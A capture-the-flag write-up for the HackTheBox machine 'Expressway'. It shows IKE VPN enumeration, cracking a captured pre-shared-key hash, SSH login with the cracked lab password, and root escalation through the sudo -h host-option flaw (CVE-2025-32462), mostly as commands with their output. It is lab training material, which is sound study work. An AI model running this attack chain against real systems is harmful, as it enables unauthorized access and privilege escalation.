---
title: Expressway - HTB
date: 2026-01-22
categories: [WriteUps, HTB]
tags: [HTB, linux, web, privesc]
image:
  base: /assets/img/posts/htb/expressway
active: false
difficulty: easy
os: linux
description: "Expressway is the 1st machine of HackTheBox Season 9."
pawned: root
---

## Scan

TCP scan reveals only SSH:

```bash
sudo nmap -n -sV -sS -Pn -p- -oN scan.txt 10.129.238.52
# PORT   STATE SERVICE VERSION
# 22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

UDP scan uncovers something more interesting:

```bash
sudo nmap -sU -p- -T4 --min-rate 1000 10.129.238.52 -oN scan-udp.txt
# PORT    STATE SERVICE
# 500/udp open  isakmp

sudo nmap -sU -sC -sV -p500 10.129.238.52
# PORT    STATE SERVICE VERSION
# 500/udp open  isakmp?
# | ike-version:
# |   attributes:
# |     XAUTH
# |_    Dead Peer Detection v1.0
```

Port 500/UDP → IPSec/IKE VPN service.

---

## Foothold

### IKE Enumeration

Reference: [HackTricks — IPSec/IKE VPN Pentesting](https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting)

First, confirm IKE is responding in Main Mode:

```bash
sudo ike-scan -M 10.129.238.52
# SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK ...)
# 1 returned handshake; 0 returned notify
```

The handshake confirms IKE negotiation is possible and our proposed transforms are accepted.

### Group ID Discovery via Aggressive Mode

Aggressive Mode leaks the group identity:

```bash
sudo ike-scan -M -A expressway.htb
# ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
```

> **ID retrieved:** `ike@expressway.htb`

### PSK Hash Capture and Cracking

Capture the PSK hash using the discovered ID:

```bash
sudo ike-scan -M -A -n ike@expressway.htb --pskcrack=hash.txt expressway.htb
```

The auth method is PSK with SHA1 → hashcat mode `5400`:

```bash
hashcat -m 5400 hash.txt /usr/share/wordlists/rockyou.txt
```

> **Password cracked:** `freakingrockstarontheroad`

---

## User

Connect via SSH with the cracked credentials:

```bash
ssh ike@expressway.htb
# Password: freakingrockstarontheroad

ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)

ike@expressway:~$ cat user.txt
```

---

## Root

### Enumeration

```bash
uname -a
# Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1

sudo -l
# Sorry, user ike may not run sudo on expressway.

sudo -V
# Sudo version 1.9.17
```

**Sudo 1.9.17** is vulnerable to [CVE-2025-32462](https://www.exploit-db.com/exploits/52354) — a Host Option Elevation of Privilege.

The exploit requires a hostname that has sudo rules defined. We search for subdomains:

```bash
grep -R ".expressway.htb" /var/log 2>/dev/null
# /var/log/squid/access.log.1: GET http://offramp.expressway.htb
```

> **Subdomain found:** `offramp.expressway.htb`

### CVE-2025-32462 — sudo -h privilege escalation

```bash
sudo -l -h offramp.expressway.htb
# User ike may run the following commands on offramp:
#     (root) NOPASSWD: ALL
```

The `-h` flag tricks sudo into evaluating rules for `offramp` instead of the local host, where `ike` has unrestricted root access:

```bash
sudo -h offramp.expressway.htb -i

root@expressway:~# id
uid=0(root) gid=0(root) groups=0(root)

root@expressway:~# cat /root/root.txt
```